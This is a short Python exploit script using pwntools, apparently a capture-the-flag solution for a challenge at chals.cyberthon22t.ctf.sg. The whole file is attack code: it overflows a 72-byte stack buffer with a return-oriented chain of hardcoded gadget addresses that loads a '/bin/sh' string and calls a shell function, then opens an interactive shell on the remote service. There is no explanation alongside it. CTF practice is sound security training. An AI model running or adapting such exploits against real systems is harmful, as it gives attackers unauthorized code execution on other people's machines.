from pwn import *
context.log_level='debug'

p = connect("chals.cyberthon22t.ctf.sg", 20401)

offset = b"A"*(64+8)
ret = p64(0x0000000000400596)
shell = p64(0x000000000040073a)
poprdi = p64(0x00000000004008b3)
bin_sh = p64(0x0000000000601010)

rop = b''
rop += offset
rop += ret
rop += poprdi
rop += bin_sh
rop += shell

p.sendline(rop)

p.interactive()
